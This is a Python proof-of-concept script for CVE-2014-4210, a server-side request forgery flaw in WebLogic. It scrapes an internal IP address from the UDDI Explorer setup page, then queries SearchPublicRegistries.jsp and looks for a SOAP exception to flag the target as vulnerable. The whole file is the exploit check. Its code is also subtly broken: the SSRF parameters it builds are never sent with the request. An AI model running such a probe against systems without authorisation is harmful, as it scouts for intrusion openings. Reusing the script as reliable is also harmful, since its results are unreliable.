#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""PoC of CVE-2014-4210
WebLogic SSRF
"""

import re
import requests


class Exploit(object):

    """Test CVE-2014-4210
    """

    def __init__(self, domain):
        """init
        """
        super(Exploit, self).__init__()
        self.domain = domain
        self.ip = ""

    def poc(self):
        if not self.get_ip():
            return False
        url = "http://%s/uddiexplorer/SearchPublicRegistries.jsp" % self.domain
        params = {
            "operator": self.ip,
            "rdoSearch": "name",
            "txtSearchname": "sdf",
            "txtSearchkey": "",
            "txtSearchfor": "",
            "selfor": "Business+location",
            "btnSubmit": "Search",
        }
        try:
            html = requests.get(url).content
            m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException', html)
            if m:
                return True
        except Exception as e:
            print(e)
        return False

    def get_ip(self):
        url = 'http://%s/uddiexplorer/SetupUDDIExplorer.jsp' % self.domain
        try:
            html = requests.get(url).content
            m = re.search('<i>For example: (.*?)/uddi/uddilistener.*?</i>', html)
            if m:
                self.ip = m.group(1)
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    e = Exploit("localhost")
    print(e.poc())
